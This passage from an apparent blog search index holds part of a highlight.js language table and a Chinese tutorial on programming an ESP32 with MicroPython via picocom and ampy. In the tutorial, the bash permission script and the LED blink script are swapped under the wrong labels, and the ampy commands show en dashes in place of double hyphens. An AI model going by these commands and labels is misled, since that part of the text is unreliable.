href="https://github.com/highlightjs/highlightjs-4d">highlightjs-4d</a></td></tr><tr><td align="left">ABAP</td><td align="left">sap-abap, abap</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-sap-abap">highlight-sap-abap</a></td></tr><tr><td align="left">ABNF</td><td align="left">abnf</td><td align="left"></td></tr><tr><td align="left">Access logs</td><td align="left">accesslog</td><td align="left"></td></tr><tr><td align="left">Ada</td><td align="left">ada</td><td align="left"></td></tr><tr><td align="left">Apex</td><td align="left">apex</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-apex/">highlightjs-apex</a></td></tr><tr><td align="left">Arduino (C++ w/Arduino libs)</td><td align="left">arduino, ino</td><td align="left"></td></tr><tr><td align="left">ARM assembler</td><td align="left">armasm, arm</td><td align="left"></td></tr><tr><td align="left">AVR assembler</td><td align="left">avrasm</td><td align="left"></td></tr><tr><td align="left">ActionScript</td><td align="left">actionscript, as</td><td align="left"></td></tr><tr><td align="left">Alan IF</td><td align="left">alan, i</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-alan">highlightjs-alan</a></td></tr><tr><td align="left">Alan</td><td align="left">ln</td><td align="left"><a href="https://github.com/alantech/highlightjs-alan">highlightjs-alan</a></td></tr><tr><td align="left">AngelScript</td><td align="left">angelscript, asc</td><td align="left"></td></tr><tr><td align="left">Apache</td><td align="left">apache, apacheconf</td><td align="left"></td></tr><tr><td align="left">AppleScript</td><td align="left">applescript, osascript</td><td align="left"></td></tr><tr><td align="left">Arcade</td><td align="left">arcade</td><td align="left"></td></tr><tr><td align="left">AsciiDoc</td><td align="left">asciidoc, adoc</td><td align="left"></td></tr><tr><td align="left">AspectJ</td><td align="left">aspectj</td><td align="left"></td></tr><tr><td align="left">AutoHotkey</td><td align="left">autohotkey</td><td align="left"></td></tr><tr><td align="left">AutoIt</td><td align="left">autoit</td><td align="left"></td></tr><tr><td align="left">Awk</td><td align="left">awk, mawk, nawk, gawk</td><td align="left"></td></tr><tr><td align="left">Bash</td><td align="left">bash, sh, zsh</td><td align="left"></td></tr><tr><td align="left">Basic</td><td align="left">basic</td><td align="left"></td></tr><tr><td align="left">BBCode</td><td align="left">bbcode</td><td align="left"><a href="https://github.com/RedGuy12/highlightjs-bbcode">highlightjs-bbcode</a></td></tr><tr><td align="left">Blade (Laravel)</td><td align="left">blade</td><td align="left"><a href="https://github.com/miken32/highlightjs-blade">highlightjs-blade</a></td></tr><tr><td align="left">BNF</td><td align="left">bnf</td><td align="left"></td></tr><tr><td align="left">Brainfuck</td><td align="left">brainfuck, bf</td><td align="left"></td></tr><tr><td align="left">C#</td><td align="left">csharp, cs</td><td align="left"></td></tr><tr><td align="left">C</td><td align="left">c, h</td><td align="left"></td></tr><tr><td align="left">C++</td><td align="left">cpp, hpp, cc, hh, c++, h++, cxx, hxx</td><td align="left"></td></tr><tr><td align="left">C/AL</td><td align="left">cal</td><td align="left"></td></tr><tr><td align="left">Cache Object Script</td><td align="left">cos, cls</td><td align="left"></td></tr><tr><td align="left">CMake</td><td align="left">cmake, cmake.in</td><td align="left"></td></tr><tr><td align="left">COBOL</td><td align="left">cobol, standard-cobol</td><td align="left"><a href="https://github.com/otterkit/highlightjs-cobol">highlightjs-cobol</a></td></tr><tr><td align="left">Coq</td><td align="left">coq</td><td align="left"></td></tr><tr><td align="left">CSP</td><td align="left">csp</td><td align="left"></td></tr><tr><td align="left">CSS</td><td align="left">css</td><td align="left"></td></tr><tr><td align="left">Cap’n Proto</td><td align="left">capnproto, capnp</td><td align="left"></td></tr><tr><td align="left">Chaos</td><td align="left">chaos, kaos</td><td align="left"><a href="https://github.com/chaos-lang/highlightjs-chaos">highlightjs-chaos</a></td></tr><tr><td align="left">Chapel</td><td align="left">chapel, chpl</td><td align="left"><a href="https://github.com/chapel-lang/highlightjs-chapel">highlightjs-chapel</a></td></tr><tr><td align="left">Cisco CLI</td><td align="left">cisco</td><td align="left"><a href="https://github.com/BMatheas/highlightjs-cisco-cli">highlightjs-cisco-cli</a></td></tr><tr><td align="left">Clojure</td><td align="left">clojure, clj</td><td align="left"></td></tr><tr><td align="left">CoffeeScript</td><td align="left">coffeescript, coffee, cson, iced</td><td align="left"></td></tr><tr><td align="left">CpcdosC+</td><td align="left">cpc</td><td align="left"><a href="https://github.com/SPinti-Software/highlightjs-cpcdos">highlightjs-cpcdos</a></td></tr><tr><td align="left">Crmsh</td><td align="left">crmsh, crm, pcmk</td><td align="left"></td></tr><tr><td align="left">Crystal</td><td align="left">crystal, cr</td><td align="left"></td></tr><tr><td align="left">cURL</td><td align="left">curl</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-curl">highlightjs-curl</a></td></tr><tr><td align="left">Cypher (Neo4j)</td><td align="left">cypher</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-cypher">highlightjs-cypher</a></td></tr><tr><td align="left">D</td><td align="left">d</td><td align="left"></td></tr><tr><td align="left">Dafny</td><td align="left">dafny</td><td align="left"><a href="https://github.com/ConsenSys/highlightjs-dafny">highlightjs-dafny</a></td></tr><tr><td align="left">Dart</td><td align="left">dart</td><td align="left"></td></tr><tr><td align="left">Delphi</td><td align="left">dpr, dfm, pas, pascal</td><td align="left"></td></tr><tr><td align="left">Diff</td><td align="left">diff, patch</td><td align="left"></td></tr><tr><td align="left">Django</td><td align="left">django, jinja</td><td align="left"></td></tr><tr><td align="left">DNS Zone file</td><td align="left">dns, zone, bind</td><td align="left"></td></tr><tr><td align="left">Dockerfile</td><td align="left">dockerfile, docker</td><td align="left"></td></tr><tr><td align="left">DOS</td><td align="left">dos, bat, cmd</td><td align="left"></td></tr><tr><td align="left">dsconfig</td><td align="left">dsconfig</td><td align="left"></td></tr><tr><td align="left">DTS (Device Tree)</td><td align="left">dts</td><td align="left"></td></tr><tr><td align="left">Dust</td><td align="left">dust, dst</td><td align="left"></td></tr><tr><td align="left">Dylan</td><td align="left">dylan</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-dylan">highlightjs-dylan</a></td></tr><tr><td align="left">EBNF</td><td align="left">ebnf</td><td align="left"></td></tr><tr><td align="left">Elixir</td><td align="left">elixir</td><td align="left"></td></tr><tr><td align="left">Elm</td><td align="left">elm</td><td align="left"></td></tr><tr><td align="left">Erlang</td><td align="left">erlang, erl</td><td align="left"></td></tr><tr><td align="left">Excel</td><td align="left">excel, xls, xlsx</td><td align="left"></td></tr><tr><td align="left">Extempore</td><td align="left">extempore, xtlang, xtm</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-xtlang">highlightjs-xtlang</a></td></tr><tr><td align="left">F#</td><td align="left">fsharp, fs</td><td align="left"></td></tr><tr><td align="left">FIX</td><td align="left">fix</td><td align="left"></td></tr><tr><td align="left">Fortran</td><td align="left">fortran, f90, f95</td><td align="left"></td></tr><tr><td align="left">FunC</td><td align="left">func</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-func">highlightjs-func</a></td></tr><tr><td align="left">G-Code</td><td align="left">gcode, nc</td><td align="left"></td></tr><tr><td align="left">Gams</td><td align="left">gams, gms</td><td align="left"></td></tr><tr><td align="left">GAUSS</td><td align="left">gauss, gss</td><td align="left"></td></tr><tr><td align="left">GDScript</td><td align="left">godot, gdscript</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-gdscript">highlightjs-gdscript</a></td></tr><tr><td align="left">Gherkin</td><td align="left">gherkin</td><td align="left"></td></tr><tr><td align="left">Glimmer and EmberJS</td><td align="left">hbs, glimmer, html.hbs, html.handlebars, htmlbars</td><td align="left"><a href="https://github.com/NullVoxPopuli/highlightjs-glimmer">highlightjs-glimmer</a></td></tr><tr><td align="left">GN for Ninja</td><td align="left">gn, gni</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-GN">highlightjs-GN</a></td></tr><tr><td align="left">Go</td><td align="left">go, golang</td><td align="left"></td></tr><tr><td align="left">Grammatical Framework</td><td align="left">gf</td><td align="left"><a href="https://github.com/johnjcamilleri/highlightjs-gf">highlightjs-gf</a></td></tr><tr><td align="left">Golo</td><td align="left">golo, gololang</td><td align="left"></td></tr><tr><td align="left">Gradle</td><td align="left">gradle</td><td align="left"></td></tr><tr><td align="left">GraphQL</td><td align="left">graphql</td><td align="left"></td></tr><tr><td align="left">Groovy</td><td align="left">groovy</td><td align="left"></td></tr><tr><td align="left">GSQL</td><td align="left">gsql</td><td align="left"><a href="https://github.com/DanBarkus/highlightjs-gsql">highlightjs-gsql</a></td></tr><tr><td align="left">HTML, XML</td><td align="left">xml, html, xhtml, rss, atom, xjb, xsd, xsl, plist, svg</td><td align="left"></td></tr><tr><td align="left">HTTP</td><td align="left">http, https</td><td align="left"></td></tr><tr><td align="left">Haml</td><td align="left">haml</td><td align="left"></td></tr><tr><td align="left">Handlebars</td><td align="left">handlebars, hbs, html.hbs, html.handlebars</td><td align="left"></td></tr><tr><td align="left">Haskell</td><td align="left">haskell, hs</td><td align="left"></td></tr><tr><td align="left">Haxe</td><td align="left">haxe, hx</td><td align="left"></td></tr><tr><td align="left">High-level shader language</td><td align="left">hlsl</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-hlsl">highlightjs-hlsl</a></td></tr><tr><td align="left">Hy</td><td align="left">hy, hylang</td><td align="left"></td></tr><tr><td align="left">Ini, TOML</td><td align="left">ini, toml</td><td align="left"></td></tr><tr><td align="left">Inform7</td><td align="left">inform7, i7</td><td align="left"></td></tr><tr><td align="left">IRPF90</td><td align="left">irpf90</td><td align="left"></td></tr><tr><td align="left">JSON</td><td align="left">json</td><td align="left"></td></tr><tr><td align="left">Java</td><td align="left">java, jsp</td><td align="left"></td></tr><tr><td align="left">JavaScript</td><td align="left">javascript, js, jsx</td><td align="left"></td></tr><tr><td align="left">Jolie</td><td align="left">jolie, iol, ol</td><td align="left"><a href="https://github.com/xiroV/highlightjs-jolie">highlightjs-jolie</a></td></tr><tr><td align="left">Julia</td><td align="left">julia, julia-repl</td><td align="left"></td></tr><tr><td align="left">Kotlin</td><td align="left">kotlin, kt</td><td align="left"></td></tr><tr><td align="left">LaTeX</td><td align="left">tex</td><td align="left"></td></tr><tr><td align="left">Leaf</td><td align="left">leaf</td><td align="left"></td></tr><tr><td align="left">Lean</td><td align="left">lean</td><td align="left"><a href="https://github.com/leanprover-community/highlightjs-lean">highlightjs-lean</a></td></tr><tr><td align="left">Lasso</td><td align="left">lasso, ls, lassoscript</td><td align="left"></td></tr><tr><td align="left">Less</td><td align="left">less</td><td align="left"></td></tr><tr><td align="left">LDIF</td><td align="left">ldif</td><td align="left"></td></tr><tr><td align="left">Lisp</td><td align="left">lisp</td><td align="left"></td></tr><tr><td align="left">LiveCode Server</td><td align="left">livecodeserver</td><td align="left"></td></tr><tr><td align="left">LiveScript</td><td align="left">livescript, ls</td><td align="left"></td></tr><tr><td align="left">LookML</td><td align="left">lookml</td><td align="left"><a href="https://github.com/spectacles-ci/highlightjs-lookml">highlightjs-lookml</a></td></tr><tr><td align="left">Lua</td><td align="left">lua</td><td align="left"></td></tr><tr><td align="left">Macaulay2</td><td align="left">macaulay2</td><td align="left"><a href="https://github.com/d-torrance/highlightjs-macaulay2">highlightjs-macaulay2</a></td></tr><tr><td align="left">Makefile</td><td align="left">makefile, mk, mak, make</td><td align="left"></td></tr><tr><td align="left">Markdown</td><td align="left">markdown, md, mkdown, mkd</td><td align="left"></td></tr><tr><td align="left">Mathematica</td><td align="left">mathematica, mma, wl</td><td align="left"></td></tr><tr><td align="left">Matlab</td><td align="left">matlab</td><td align="left"></td></tr><tr><td align="left">Maxima</td><td align="left">maxima</td><td align="left"></td></tr><tr><td align="left">Maya Embedded Language</td><td align="left">mel</td><td align="left"></td></tr><tr><td align="left">Mercury</td><td align="left">mercury</td><td align="left"></td></tr><tr><td align="left">mIRC Scripting Language</td><td align="left">mirc, mrc</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-mirc">highlightjs-mirc</a></td></tr><tr><td align="left">Mizar</td><td align="left">mizar</td><td align="left"></td></tr><tr><td align="left">MKB</td><td align="left">mkb</td><td align="left"><a href="https://github.com/Dereavy/highlightjs-mkb">highlightjs-mkb</a></td></tr><tr><td align="left">MLIR</td><td align="left">mlir</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-mlir">highlightjs-mlir</a></td></tr><tr><td align="left">Mojolicious</td><td align="left">mojolicious</td><td align="left"></td></tr><tr><td align="left">Monkey</td><td align="left">monkey</td><td align="left"></td></tr><tr><td align="left">Moonscript</td><td align="left">moonscript, moon</td><td align="left"></td></tr><tr><td align="left">N1QL</td><td align="left">n1ql</td><td align="left"></td></tr><tr><td align="left">NSIS</td><td align="left">nsis</td><td align="left"></td></tr><tr><td align="left">Never</td><td align="left">never</td><td align="left"><a href="https://github.com/never-lang/highlightjs-never">highlightjs-never</a></td></tr><tr><td align="left">Nginx</td><td align="left">nginx, nginxconf</td><td align="left"></td></tr><tr><td align="left">Nim</td><td align="left">nim, nimrod</td><td align="left"></td></tr><tr><td align="left">Nix</td><td align="left">nix</td><td align="left"></td></tr><tr><td align="left">Oak</td><td align="left">oak</td><td align="left"><a href="https://github.com/timlabs/highlightjs-oak">highlightjs-oak</a></td></tr><tr><td align="left">Object Constraint Language</td><td align="left">ocl</td><td align="left"><a href="https://github.com/nhomble/highlightjs-ocl">highlightjs-ocl</a></td></tr><tr><td align="left">OCaml</td><td align="left">ocaml, ml</td><td align="left"></td></tr><tr><td align="left">Objective C</td><td align="left">objectivec, mm, objc, obj-c, obj-c++, objective-c++</td><td align="left"></td></tr><tr><td align="left">OpenGL Shading Language</td><td align="left">glsl</td><td align="left"></td></tr><tr><td align="left">OpenSCAD</td><td align="left">openscad, scad</td><td align="left"></td></tr><tr><td align="left">Oracle Rules Language</td><td align="left">ruleslanguage</td><td align="left"></td></tr><tr><td align="left">Oxygene</td><td align="left">oxygene</td><td align="left"></td></tr><tr><td align="left">PF</td><td align="left">pf, pf.conf</td><td align="left"></td></tr><tr><td align="left">PHP</td><td align="left">php</td><td align="left"></td></tr><tr><td align="left">Papyrus</td><td align="left">papyrus, psc</td><td align="left"><a href="https://github.com/Pickysaurus/highlightjs-papyrus">highlightjs-papyrus</a></td></tr><tr><td align="left">Parser3</td><td align="left">parser3</td><td align="left"></td></tr><tr><td align="left">Perl</td><td align="left">perl, pl, pm</td><td align="left"></td></tr><tr><td align="left">Pine Script</td><td align="left">pine, pinescript</td><td align="left"><a href="https://github.com/jeyllani/highlightjs-pine">highlightjs-pine</a></td></tr><tr><td align="left">Plaintext</td><td align="left">plaintext, txt, text</td><td align="left"></td></tr><tr><td align="left">Pony</td><td align="left">pony</td><td align="left"></td></tr><tr><td align="left">PostgreSQL &amp; PL/pgSQL</td><td align="left">pgsql, postgres, postgresql</td><td align="left"></td></tr><tr><td align="left">PowerShell</td><td align="left">powershell, ps, ps1</td><td align="left"></td></tr><tr><td align="left">Processing</td><td align="left">processing</td><td align="left"></td></tr><tr><td align="left">Prolog</td><td align="left">prolog</td><td align="left"></td></tr><tr><td align="left">Properties</td><td align="left">properties</td><td align="left"></td></tr><tr><td align="left">Protocol Buffers</td><td align="left">protobuf</td><td align="left"></td></tr><tr><td align="left">Puppet</td><td align="left">puppet, pp</td><td align="left"></td></tr><tr><td align="left">Python</td><td align="left">python, py, gyp</td><td align="left"></td></tr><tr><td align="left">Python profiler results</td><td align="left">profile</td><td align="left"></td></tr><tr><td align="left">Python REPL</td><td align="left">python-repl, pycon</td><td align="left"></td></tr><tr><td align="left">Q#</td><td align="left">qsharp</td><td align="left"><a href="https://github.com/fedonman/highlightjs-qsharp">highlightjs-qsharp</a></td></tr><tr><td align="left">Q</td><td align="left">k, kdb</td><td align="left"></td></tr><tr><td align="left">QML</td><td align="left">qml</td><td align="left"></td></tr><tr><td align="left">R</td><td align="left">r</td><td align="left"></td></tr><tr><td align="left">Razor CSHTML</td><td align="left">cshtml, razor, razor-cshtml</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-cshtml-razor">highlightjs-cshtml-razor</a></td></tr><tr><td align="left">ReasonML</td><td align="left">reasonml, re</td><td align="left"></td></tr><tr><td align="left">Rebol &amp; Red</td><td align="left">redbol, rebol, red, red-system</td><td align="left"><a href="https://github.com/oldes/highlightjs-redbol">highlightjs-redbol</a></td></tr><tr><td align="left">RenderMan RIB</td><td align="left">rib</td><td align="left"></td></tr><tr><td align="left">RenderMan RSL</td><td align="left">rsl</td><td align="left"></td></tr><tr><td align="left">RiScript</td><td align="left">risc, riscript</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-riscript">highlightjs-riscript</a></td></tr><tr><td align="left">Roboconf</td><td align="left">graph, instances</td><td align="left"></td></tr><tr><td align="left">Robot Framework</td><td align="left">robot, rf</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-robot">highlightjs-robot</a></td></tr><tr><td align="left">RPM spec files</td><td align="left">rpm-specfile, rpm, spec, rpm-spec, specfile</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-rpm-specfile">highlightjs-rpm-specfile</a></td></tr><tr><td align="left">Ruby</td><td align="left">ruby, rb, gemspec, podspec, thor, irb</td><td align="left"></td></tr><tr><td align="left">Rust</td><td align="left">rust, rs</td><td align="left"></td></tr><tr><td align="left">SAS</td><td align="left">SAS, sas</td><td align="left"></td></tr><tr><td align="left">SCSS</td><td align="left">scss</td><td align="left"></td></tr><tr><td align="left">SQL</td><td align="left">sql</td><td align="left"></td></tr><tr><td align="left">STEP Part 21</td><td align="left">p21, step, stp</td><td align="left"></td></tr><tr><td align="left">Scala</td><td align="left">scala</td><td align="left"></td></tr><tr><td align="left">Scheme</td><td align="left">scheme</td><td align="left"></td></tr><tr><td align="left">Scilab</td><td align="left">scilab, sci</td><td align="left"></td></tr><tr><td align="left">Shape Expressions</td><td align="left">shexc</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-shexc">highlightjs-shexc</a></td></tr><tr><td align="left">Shell</td><td align="left">shell, console</td><td align="left"></td></tr><tr><td align="left">Smali</td><td align="left">smali</td><td align="left"></td></tr><tr><td align="left">Smalltalk</td><td align="left">smalltalk, st</td><td align="left"></td></tr><tr><td align="left">SML</td><td align="left">sml, ml</td><td align="left"></td></tr><tr><td align="left">Solidity</td><td align="left">solidity, sol</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-solidity">highlightjs-solidity</a></td></tr><tr><td align="left">Splunk SPL</td><td align="left">spl</td><td align="left"><a href="https://github.com/swsoyee/highlightjs-spl">highlightjs-spl</a></td></tr><tr><td align="left">Stan</td><td align="left">stan, stanfuncs</td><td align="left"></td></tr><tr><td align="left">Stata</td><td align="left">stata</td><td align="left"></td></tr><tr><td align="left">Structured Text</td><td align="left">iecst, scl, stl, structured-text</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-structured-text">highlightjs-structured-text</a></td></tr><tr><td align="left">Stylus</td><td align="left">stylus, styl</td><td align="left"></td></tr><tr><td align="left">SubUnit</td><td align="left">subunit</td><td align="left"></td></tr><tr><td align="left">Supercollider</td><td align="left">supercollider, sc</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-supercollider">highlightjs-supercollider</a></td></tr><tr><td align="left">Svelte</td><td align="left">svelte</td><td align="left"><a href="https://github.com/AlexxNB/highlightjs-svelte">highlightjs-svelte</a></td></tr><tr><td align="left">Swift</td><td align="left">swift</td><td align="left"></td></tr><tr><td align="left">Tcl</td><td align="left">tcl, tk</td><td align="left"></td></tr><tr><td align="left">Terraform (HCL)</td><td align="left">terraform, tf, hcl</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-terraform">highlightjs-terraform</a></td></tr><tr><td align="left">Test Anything Protocol</td><td align="left">tap</td><td align="left"></td></tr><tr><td align="left">Thrift</td><td align="left">thrift</td><td align="left"></td></tr><tr><td align="left">Toit</td><td align="left">toit</td><td align="left"><a href="https://github.com/snxx-lppxx/toit-highlight">toit-highlight</a></td></tr><tr><td align="left">TP</td><td align="left">tp</td><td align="left"></td></tr><tr><td align="left">Transact-SQL</td><td align="left">tsql</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-tsql">highlightjs-tsql</a></td></tr><tr><td align="left">Twig</td><td align="left">twig, craftcms</td><td align="left"></td></tr><tr><td align="left">TypeScript</td><td align="left">typescript, ts</td><td align="left"></td></tr><tr><td align="left">Unicorn Rails log</td><td align="left">unicorn-rails-log</td><td align="left"><a href="https://github.com/sweetppro/highlightjs-unicorn-rails-log">highlightjs-unicorn-rails-log</a></td></tr><tr><td align="left">VB.Net</td><td align="left">vbnet, vb</td><td align="left"></td></tr><tr><td align="left">VBA</td><td align="left">vba</td><td align="left"><a href="https://github.com/dullin/highlightjs-vba">highlightjs-vba</a></td></tr><tr><td align="left">VBScript</td><td align="left">vbscript, vbs</td><td align="left"></td></tr><tr><td align="left">VHDL</td><td align="left">vhdl</td><td align="left"></td></tr><tr><td align="left">Vala</td><td align="left">vala</td><td align="left"></td></tr><tr><td align="left">Verilog</td><td align="left">verilog, v</td><td align="left"></td></tr><tr><td align="left">Vim Script</td><td align="left">vim</td><td align="left"></td></tr><tr><td align="left">X#</td><td align="left">xsharp, xs, prg</td><td align="left"><a href="https://github.com/InfomindsAg/highlightjs-xsharp">highlightjs-xsharp</a></td></tr><tr><td align="left">X++</td><td align="left">axapta, x++</td><td align="left"></td></tr><tr><td align="left">x86 Assembly</td><td align="left">x86asm</td><td align="left"></td></tr><tr><td align="left">XL</td><td align="left">xl, tao</td><td align="left"></td></tr><tr><td align="left">XQuery</td><td align="left">xquery, xpath, xq</td><td align="left"></td></tr><tr><td align="left">YAML</td><td align="left">yml, yaml</td><td align="left"></td></tr><tr><td align="left">ZenScript</td><td align="left">zenscript, zs</td><td align="left"><a href="https://github.com/highlightjs/highlightjs-zenscript">highlightjs-zenscript</a></td></tr><tr><td align="left">Zephir</td><td align="left">zephir, zep</td><td align="left"></td></tr></tbody></table><!-- LANGLIST_END --><!-- document it until we can fix it --><h2 id="Alias-Overlap"><a href="#Alias-Overlap" class="headerlink" title="Alias Overlap"></a>Alias Overlap</h2><p>If you are using either of these languages at the same time please be sure to<br>use the full name and not the alias to avoid any ambiguity.</p><table><thead><tr><th align="left">Language</th><th align="left">Overlap</th></tr></thead><tbody><tr><td align="left">SML</td><td align="left">ml</td></tr><tr><td align="left">OCaml</td><td align="left">ml</td></tr><tr><td align="left">Lasso</td><td align="left">ls</td></tr><tr><td align="left">LiveScript</td><td align="left">ls</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在终端下使用MicroPython编程ESP32</title>
    <link href="/ESP32-pyinShell/"/>
    <url>/ESP32-pyinShell/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天第一次真正给板子刷上MicroPython，因为我出门只带了几天前说的刚买那个中柏电脑，刷成了纯linux系统，就想试试从开源工具刷写开发板。</p><h1 id="困扰"><a href="#困扰" class="headerlink" title="困扰"></a>困扰</h1><p>按照流程很轻松就能用esp-tool.py清空flash，然后刷上固件，但怎样编写程序就没有资料了。有教程说可以挂载成u盘一样的设备，但至少这个板子不行。经过疯狂寻找，正当我快放弃时找到这样一篇文章<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="http://yhhuang1966.blogspot.com/2019/07/micropython-on-esp32.html">[1]</span></a></sup>。</p><p>进而通过向REPL方向的寻找，确定了一种只需linux终端就可用的方法，而且无需Thonny<br>(但是需要adafruit-ampy :P)</p><h1 id="简要流程"><a href="#简要流程" class="headerlink" title="简要流程"></a>简要流程</h1><h2 id="picocom"><a href="#picocom" class="headerlink" title="picocom"></a>picocom</h2><blockquote><p>sudo apt-get install picocom </p></blockquote><ol><li>该步骤安装的是串口终端助手,在<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="http://yhhuang1966.blogspot.com/2019/07/micropython-on-esp32.html">[1]</span></a></sup>中有提到</li><li>配置串口权限，文末附上参考脚本，记得变通</li></ol><blockquote><p>sudo picocom -b 115200 /dev/ttyUSB0 </p></blockquote><ol start="3"><li>使用串口连接开发板</li><li>注意看picocom给出的信息:Type [C-a] [C-h] to see available commands 就是先按ctrl+a，再按ctrl+h</li><li>连接后按几下回车才会出现熟悉的REPL界面</li></ol><h2 id="ampy"><a href="#ampy" class="headerlink" title="ampy"></a>ampy</h2><ol><li><p>pip给出提示大概意思就是不要用sudo，所以我用的是 pip install adafruit-ampy</p></li><li><p>ampy –version 我用不了，不造是为虾米，反正不粽药啦</p></li><li><p>但是ampy –help 有用，可以看到具体操作和linux shell 类似，mkdir、ls、rm、rmdir都不用说了。</p><blockquote><p>ampy –port /dev/ttyUSB0 run led.py</p></blockquote></li><li><p> 跑当前目录下的led.py文件<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote">&lt;span class=”hint–top hint–rounded” aria-label=”led.py</p><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>ls -al /dev/ttyUSB0<br>chmod 666 /dev/ttyUSB0<br>sudo chmod 666 /dev/ttyUSB0 <br>ls -al /dev/ttyUSB0 <br><span class="hljs-built_in">exit</span> 0<br></code></pre>">[5]</span></a></sup>，ctrl+c没法打断<blockquote><p>ampy –port /dev/ttyUSB0 reset </p></blockquote></li><li><p>给板子软重启，如果死循环没写到main.py就能打断了。但如果写到main.py的话据说<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="http://yhhuang1966.blogspot.com/2019/07/micropython-on-esp32.html">[1]</span></a></sup>只能重刷固件了</p></li></ol><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>picocom 开启时用不了ampy，因为picocom会占用串口，按ctrl+a，之后ctrl+x退出picocom</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>配置串口权限的脚本:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">功能介绍： LED闪烁例程</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> utime<br><span class="hljs-keyword">import</span> machine<br><br><span class="hljs-comment"># 声明一个引脚 例如 22 作为我们特定开发板板载LED的引脚</span><br>led_pin = machine.Pin(<span class="hljs-number">22</span>, machine.Pin.OUT)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    <span class="hljs-comment"># 点亮LED -&gt; 高电平</span><br>    led_pin.value(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># 延时 500ms</span><br>    utime.sleep_ms(<span class="hljs-number">500</span>)<br>    <span class="hljs-comment"># 关闭LED -&gt; 低电平</span><br>    led_pin.value(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># 延时500ms</span><br>    utime.sleep_ms(<span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p>还有如下几篇文章以供参考：</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="http://yhhuang1966.blogspot.com/2019/07/micropython-on-esp32.html">http://yhhuang1966.blogspot.com/2019/07/micropython-on-esp32.html</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://www.cirmall.com/bbs/thread-102620-1-1.html">https://www.cirmall.com/bbs/thread-102620-1-1.html</a> 介绍了picocom和ampy两种方法，对从底层了解和开发板通信帮助很大<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://docs.micropython.org/en/v1.8.3/esp8266/esp8266/tutorial/repl.html">https://docs.micropython.org/en/v1.8.3/esp8266/esp8266/tutorial/repl.html</a> 官方文档，介绍了REPL的基本操作<a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://docs.micropython.org/en/v1.8.3/esp8266/esp8266/tutorial/filesystem.html#creating-and-reading-files">https://docs.micropython.org/en/v1.8.3/esp8266/esp8266/tutorial/filesystem.html#creating-and-reading-files</a> 介绍了文件和文件夹的增删，但没有改查<a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span>led.py<figure class="highlight python"><table><tr><td class="gutter">undefined</td><td class="code">undefined</td></tr></table></figure><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式</tag>
      
      <tag>Linux</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在终端下使用MicroPython编程ESP32</title>
    <link href="/microPythonProgInLinux/"/>
